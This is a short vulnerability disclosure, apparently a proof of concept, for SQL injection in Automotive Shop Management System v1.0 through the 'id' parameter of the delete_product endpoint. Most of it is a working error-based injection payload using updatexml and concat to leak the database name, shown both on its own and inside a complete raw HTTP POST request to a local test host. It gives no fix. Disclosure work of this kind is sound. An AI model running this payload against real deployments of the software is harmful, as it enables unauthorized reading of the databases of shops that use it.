# Automotive Shop Management System v1.0 has SQL injection

vendors: https://www.sourcecodester.com/php/15312/automotive-shop-management-system-phpoop-free-source-code.html

Date: 2022-05-07

Vulnerability File: /asms/classes/Master.php?f=delete_product

Vulnerability location: /asms/classes/Master.php?f=delete_product, id

[+] Payload: id=5' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+ // Leak place ---> id

Tested on Windows 10, XAMPP

```
POST /asms/classes/Master.php?f=delete_product HTTP/1.1
Host: 192.168.2.106
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 65
Origin: http://192.168.2.106
Connection: keep-alive
Referer: http://192.168.2.106/asms/admin/?page=products
Cookie: PHPSESSID=0389fublnj7ggho8q04fuvfaqe

id=5' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+
```

![](https://github.com/mikeccltt/automotive/blob/main/automotive-shop-management-system/sql.gif?raw=true)

